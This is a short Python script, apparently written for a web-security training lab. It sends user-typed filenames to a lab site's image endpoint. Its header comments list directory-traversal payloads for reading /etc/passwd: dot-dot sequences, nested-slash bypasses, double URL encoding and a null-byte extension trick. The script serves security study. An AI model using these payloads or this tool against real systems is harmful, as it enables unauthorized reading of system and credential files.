# Directory Traversal
# 1 input ../../../../../etc/passwd
# 2 input /etc/passwd
# 3 input ....//....//....//....//....//etc/passwd
# 4 config double urllencoded input ../../../../../../etc/passwd
# 5 input /var/www/images/../../../etc/passwd
# 6 input ../../../../etc/passwd%00.jpg

from shell import prompt
import requests
from bs4 import BeautifulSoup
from webtools import urlencode


url = "https://ac841f001e6c0d4480fc1e3a004500b3.web-security-academy.net"
sess = requests.session()

p = prompt()


def cexe(filename):
    # Challenge 4 specific
    # target = "/image?filename=" + urlencode(urlencode(filename))
    target = "/image?filename=" + filename
    resp = sess.get(url+target)
    page = resp.text
    soup = BeautifulSoup(page, 'lxml')
    lst = soup.find_all('div')
    try:
        print(lst[6].renderContents().decode(), end="")
    except IndexError:
        print(page)


while True:
    inj = p.input("[ filename > ] ")
    if inj == "":
        continue
    cexe(inj)
